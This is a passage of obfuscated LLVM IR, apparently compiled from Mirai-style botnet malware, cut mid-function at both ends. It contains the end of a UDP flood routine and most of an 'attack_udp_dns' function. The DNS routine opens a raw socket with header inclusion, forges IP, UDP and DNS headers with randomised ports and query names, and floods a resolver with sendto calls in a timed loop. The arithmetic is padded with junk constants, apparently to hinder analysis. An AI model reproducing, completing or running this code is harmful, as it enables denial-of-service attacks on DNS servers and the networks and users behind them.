  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i64 1
  %99 = bitcast %struct.iphdr* %98 to %struct.udphdr*
  store %struct.udphdr* %99, %struct.udphdr** %24, align 8
  %100 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i64 1
  %102 = bitcast %struct.udphdr* %101 to i8*
  store i8* %102, i8** %25, align 8
  %103 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %104 = bitcast %struct.iphdr* %103 to i8*
  %105 = load i8, i8* %104, align 4
  %106 = xor i8 15, -1
  %107 = xor i8 %105, %106
  %108 = and i8 %107, %105
  %109 = and i8 %105, 15
  %110 = and i8 %108, 64
  %111 = xor i8 %108, 64
  %112 = or i8 %110, %111
  %113 = or i8 %108, 64
  store i8 %112, i8* %104, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 -16, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, -16
  %121 = and i8 %119, 5
  %122 = xor i8 %119, 5
  %123 = or i8 %121, %122
  %124 = or i8 %119, 5
  store i8 %123, i8* %115, align 4
  %125 = load i8, i8* %14, align 1
  %126 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i32 0, i32 1
  store i8 %125, i8* %127, align 1
  %128 = load i32, i32* %21, align 4
  %129 = sext i32 %128 to i64
  %130 = sub i64 0, %129
  %131 = sub i64 32, %130
  %132 = add i64 32, %129
  %133 = trunc i64 %131 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %15, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %16, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %17, align 1
  %145 = icmp ne i8 %144, 0
  br i1 %145, label %146, label %150

; <label>:146:                                    ; preds = %85
  %147 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 4
  store i16 %147, i16* %149, align 2
  br label %150

; <label>:150:                                    ; preds = %146, %85
  %151 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 6
  store i8 17, i8* %152, align 1
  %153 = load i32, i32* @LOCAL_ADDR, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 8
  store i32 %153, i32* %155, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 9
  store i32 %161, i32* %163, align 4
  %164 = load i16, i16* %18, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %19, align 2
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load i32, i32* %21, align 4
  %173 = sext i32 %172 to i64
  %174 = add i64 12, 7226837174929863674
  %175 = add i64 %174, %173
  %176 = sub i64 %175, 7226837174929863674
  %177 = add i64 12, %173
  %178 = trunc i64 %176 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 2
  %182 = load i8*, i8** %25, align 8
  %183 = bitcast i8* %182 to i32*
  store i32 -1, i32* %183, align 4
  %184 = load i8*, i8** %25, align 8
  %185 = getelementptr inbounds i8, i8* %184, i64 4
  store i8* %185, i8** %25, align 8
  %186 = load i8*, i8** %25, align 8
  %187 = load i8*, i8** %20, align 8
  %188 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %186, i8* %187, i32 %188)
  br label %189

; <label>:189:                                    ; preds = %150
  %190 = load i32, i32* %11, align 4
  %191 = sub i32 0, 1
  %192 = sub i32 %190, %191
  %193 = add nsw i32 %190, 1
  store i32 %192, i32* %11, align 4
  br label %80

; <label>:194:                                    ; preds = %80
  br label %195

; <label>:195:                                    ; preds = %338, %194
  store i32 0, i32* %11, align 4
  br label %196

; <label>:196:                                    ; preds = %326, %195
  %197 = load i32, i32* %11, align 4
  %198 = load i8, i8* %7, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp slt i32 %197, %199
  br i1 %200, label %201, label %332

; <label>:201:                                    ; preds = %196
  %202 = load i8**, i8*** %13, align 8
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8*, i8** %202, i64 %204
  %206 = load i8*, i8** %205, align 8
  store i8* %206, i8** %26, align 8
  %207 = load i8*, i8** %26, align 8
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %27, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.udphdr*
  store %struct.udphdr* %211, %struct.udphdr** %28, align 8
  %212 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 2
  %217 = load i8, i8* %216, align 4
  %218 = zext i8 %217 to i32
  %219 = icmp slt i32 %218, 32
  br i1 %219, label %220, label %245

; <label>:220:                                    ; preds = %201
  %221 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %222 = load i32, i32* %11, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 1
  %226 = load i32, i32* %225, align 4
  %227 = call i32 @ntohl(i32 %226) #7
  %228 = call i32 @rand_next()
  %229 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %230 = load i32, i32* %11, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = lshr i32 %228, %235
  %237 = sub i32 0, %227
  %238 = sub i32 0, %236
  %239 = add i32 %237, %238
  %240 = sub i32 0, %239
  %241 = add i32 %227, %236
  %242 = call i32 @htonl(i32 %240) #7
  %243 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 9
  store i32 %242, i32* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %220, %201
  %246 = load i16, i16* %15, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %245
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 3
  store i16 %251, i16* %253, align 4
  br label %254

; <label>:254:                                    ; preds = %249, %245
  %255 = load i16, i16* %18, align 2
  %256 = zext i16 %255 to i32
  %257 = icmp eq i32 %256, 65535
  br i1 %257, label %258, label %263

; <label>:258:                                    ; preds = %254
  %259 = call i32 @rand_next()
  %260 = trunc i32 %259 to i16
  %261 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 0
  store i16 %260, i16* %262, align 2
  br label %263

; <label>:263:                                    ; preds = %258, %254
  %264 = load i16, i16* %19, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 65535
  br i1 %266, label %267, label %272

; <label>:267:                                    ; preds = %263
  %268 = call i32 @rand_next()
  %269 = trunc i32 %268 to i16
  %270 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 1
  store i16 %269, i16* %271, align 2
  br label %272

; <label>:272:                                    ; preds = %267, %263
  %273 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 7
  store i16 0, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %276 = bitcast %struct.iphdr* %275 to i16*
  %277 = call zeroext i16 @checksum_generic(i16* %276, i32 20)
  %278 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 7
  store i16 %277, i16* %279, align 2
  %280 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %281 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %280, i32 0, i32 3
  store i16 0, i16* %281, align 2
  %282 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %283 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %284 = bitcast %struct.udphdr* %283 to i8*
  %285 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 2
  %287 = load i16, i16* %286, align 2
  %288 = load i32, i32* %21, align 4
  %289 = sext i32 %288 to i64
  %290 = sub i64 0, 12
  %291 = sub i64 0, %289
  %292 = add i64 %290, %291
  %293 = sub i64 0, %292
  %294 = add i64 12, %289
  %295 = trunc i64 %293 to i32
  %296 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %282, i8* %284, i16 zeroext %287, i32 %295)
  %297 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 2
  %299 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 1
  %301 = load i16, i16* %300, align 2
  %302 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %303 = load i32, i32* %11, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 0
  %307 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %306, i32 0, i32 1
  store i16 %301, i16* %307, align 2
  %308 = load i32, i32* %12, align 4
  %309 = load i8*, i8** %26, align 8
  %310 = load i32, i32* %21, align 4
  %311 = sext i32 %310 to i64
  %312 = sub i64 32, -1736382216037865960
  %313 = add i64 %312, %311
  %314 = add i64 %313, -1736382216037865960
  %315 = add i64 32, %311
  %316 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %317 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %318 = load i32, i32* %11, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 0
  %322 = bitcast %struct.sockaddr_in* %321 to %struct.sockaddr*
  store %struct.sockaddr* %322, %struct.sockaddr** %316, align 8
  %323 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %324 = load %struct.sockaddr*, %struct.sockaddr** %323, align 8
  %325 = call i64 @sendto(i32 %308, i8* %309, i64 %314, i32 16384, %struct.sockaddr* %324, i32 16)
  br label %326

; <label>:326:                                    ; preds = %272
  %327 = load i32, i32* %11, align 4
  %328 = sub i32 %327, 1549968724
  %329 = add i32 %328, 1
  %330 = add i32 %329, 1549968724
  %331 = add nsw i32 %327, 1
  store i32 %330, i32* %11, align 4
  br label %196

; <label>:332:                                    ; preds = %196
  %333 = call i64 @time(i64* null) #6
  %334 = load i32, i32* %22, align 4
  %335 = sext i32 %334 to i64
  %336 = icmp sgt i64 %333, %335
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %332
  br label %339

; <label>:338:                                    ; preds = %332
  br label %195

; <label>:339:                                    ; preds = %337, %76, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 %81, -1332465343897679343
  %85 = add i64 %84, %83
  %86 = add i64 %85, -1332465343897679343
  %87 = add nsw i64 %81, %83
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %25, align 4
  %89 = load i8*, i8** %22, align 8
  %90 = icmp eq i8* %89, null
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %5
  br label %540

; <label>:92:                                     ; preds = %5
  %93 = load i8*, i8** %22, align 8
  %94 = call i32 @util_strlen(i8* %93)
  store i32 %94, i32* %23, align 4
  %95 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %95, i32* %12, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %92
  br label %540

; <label>:98:                                     ; preds = %92
  store i32 1, i32* %11, align 4
  %99 = load i32, i32* %12, align 4
  %100 = bitcast i32* %11 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 0, i32 3, i8* %100, i32 4) #6
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  br label %540

; <label>:106:                                    ; preds = %98
  store i32 0, i32* %11, align 4
  br label %107

; <label>:107:                                    ; preds = %337, %106
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  br i1 %111, label %112, label %344

; <label>:112:                                    ; preds = %107
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %113 = call noalias i8* @calloc(i64 600, i64 1) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %29, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.udphdr*
  store %struct.udphdr* %126, %struct.udphdr** %30, align 8
  %127 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i64 1
  %129 = bitcast %struct.udphdr* %128 to %struct.dnshdr*
  store %struct.dnshdr* %129, %struct.dnshdr** %31, align 8
  %130 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %131 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %130, i64 1
  %132 = bitcast %struct.dnshdr* %131 to i8*
  store i8* %132, i8** %32, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = xor i8 15, -1
  %137 = xor i8 %135, %136
  %138 = and i8 %137, %135
  %139 = and i8 %135, 15
  %140 = xor i8 %138, -1
  %141 = xor i8 64, -1
  %142 = xor i8 70, -1
  %143 = and i8 %140, 70
  %144 = and i8 %138, %142
  %145 = and i8 %141, 70
  %146 = and i8 64, %142
  %147 = or i8 %143, %144
  %148 = or i8 %145, %146
  %149 = xor i8 %147, %148
  %150 = or i8 %140, %141
  %151 = xor i8 %150, -1
  %152 = or i8 70, %142
  %153 = and i8 %151, %152
  %154 = or i8 %149, %153
  %155 = or i8 %138, 64
  store i8 %154, i8* %134, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = load i8, i8* %157, align 4
  %159 = xor i8 -16, -1
  %160 = xor i8 %158, %159
  %161 = and i8 %160, %158
  %162 = and i8 %158, -16
  %163 = xor i8 %161, -1
  %164 = xor i8 5, -1
  %165 = xor i8 -124, -1
  %166 = and i8 %163, -124
  %167 = and i8 %161, %165
  %168 = and i8 %164, -124
  %169 = and i8 5, %165
  %170 = or i8 %166, %167
  %171 = or i8 %168, %169
  %172 = xor i8 %170, %171
  %173 = or i8 %163, %164
  %174 = xor i8 %173, -1
  %175 = or i8 -124, %165
  %176 = and i8 %174, %175
  %177 = or i8 %172, %176
  %178 = or i8 %161, 5
  store i8 %177, i8* %157, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i8, i8* %21, align 1
  %183 = zext i8 %182 to i64
  %184 = sub i64 41, -8465058264636022371
  %185 = add i64 %184, %183
  %186 = add i64 %185, -8465058264636022371
  %187 = add i64 41, %183
  %188 = sub i64 %186, 1566297530663229365
  %189 = add i64 %188, 2
  %190 = add i64 %189, 1566297530663229365
  %191 = add i64 %186, 2
  %192 = load i32, i32* %23, align 4
  %193 = sext i32 %192 to i64
  %194 = sub i64 0, %193
  %195 = sub i64 %190, %194
  %196 = add i64 %190, %193
  %197 = sub i64 %195, 8541137145586848343
  %198 = add i64 %197, 4
  %199 = add i64 %198, 8541137145586848343
  %200 = add i64 %195, 4
  %201 = trunc i64 %199 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 2
  %205 = load i16, i16* %15, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i16 %206, i16* %208, align 4
  %209 = load i8, i8* %16, align 1
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 5
  store i8 %209, i8* %211, align 4
  %212 = load i8, i8* %17, align 1
  %213 = icmp ne i8 %212, 0
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %112
  %215 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %216 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 4
  store i16 %215, i16* %217, align 2
  br label %218

; <label>:218:                                    ; preds = %214, %112
  %219 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 6
  store i8 17, i8* %220, align 1
  %221 = load i32, i32* @LOCAL_ADDR, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 8
  store i32 %221, i32* %223, align 4
  %224 = load i32, i32* %24, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  %227 = load i16, i16* %18, align 2
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 0
  store i16 %228, i16* %230, align 2
  %231 = load i16, i16* %19, align 2
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 1
  store i16 %232, i16* %234, align 2
  %235 = load i8, i8* %21, align 1
  %236 = zext i8 %235 to i64
  %237 = add i64 21, -5181018706188239944
  %238 = add i64 %237, %236
  %239 = sub i64 %238, -5181018706188239944
  %240 = add i64 21, %236
  %241 = sub i64 0, %239
  %242 = sub i64 0, 2
  %243 = add i64 %241, %242
  %244 = sub i64 0, %243
  %245 = add i64 %239, 2
  %246 = load i32, i32* %23, align 4
  %247 = sext i32 %246 to i64
  %248 = sub i64 0, %244
  %249 = sub i64 0, %247
  %250 = add i64 %248, %249
  %251 = sub i64 0, %250
  %252 = add i64 %244, %247
  %253 = sub i64 0, 4
  %254 = sub i64 %251, %253
  %255 = add i64 %251, 4
  %256 = trunc i64 %254 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  %260 = load i16, i16* %20, align 2
  %261 = call zeroext i16 @htons(i16 zeroext %260) #7
  %262 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %263 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %262, i32 0, i32 0
  store i16 %261, i16* %263, align 2
  %264 = call zeroext i16 @htons(i16 zeroext 256) #7
  %265 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %266 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %265, i32 0, i32 1
  store i16 %264, i16* %266, align 2
  %267 = call zeroext i16 @htons(i16 zeroext 1) #7
  %268 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %269 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %268, i32 0, i32 2
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %21, align 1
  %271 = load i8*, i8** %32, align 8
  %272 = getelementptr inbounds i8, i8* %271, i32 1
  store i8* %272, i8** %32, align 8
  store i8 %270, i8* %271, align 1
  %273 = load i8, i8* %21, align 1
  %274 = zext i8 %273 to i32
  %275 = load i8*, i8** %32, align 8
  %276 = sext i32 %274 to i64
  %277 = getelementptr inbounds i8, i8* %275, i64 %276
  store i8* %277, i8** %32, align 8
  %278 = load i8*, i8** %32, align 8
  store i8* %278, i8** %33, align 8
  %279 = load i8*, i8** %32, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 1
  %281 = load i8*, i8** %22, align 8
  %282 = load i32, i32* %23, align 4
  %283 = sub i32 0, 1
  %284 = sub i32 %282, %283
  %285 = add nsw i32 %282, 1
  call void @util_memcpy(i8* %280, i8* %281, i32 %284)
  store i32 0, i32* %26, align 4
  br label %286

; <label>:286:                                    ; preds = %317, %218
  %287 = load i32, i32* %26, align 4
  %288 = load i32, i32* %23, align 4
  %289 = icmp slt i32 %287, %288
  br i1 %289, label %290, label %322

; <label>:290:                                    ; preds = %286
  %291 = load i8*, i8** %22, align 8
  %292 = load i32, i32* %26, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds i8, i8* %291, i64 %293
  %295 = load i8, i8* %294, align 1
  %296 = sext i8 %295 to i32
  %297 = icmp eq i32 %296, 46
  br i1 %297, label %298, label %311

; <label>:298:                                    ; preds = %290
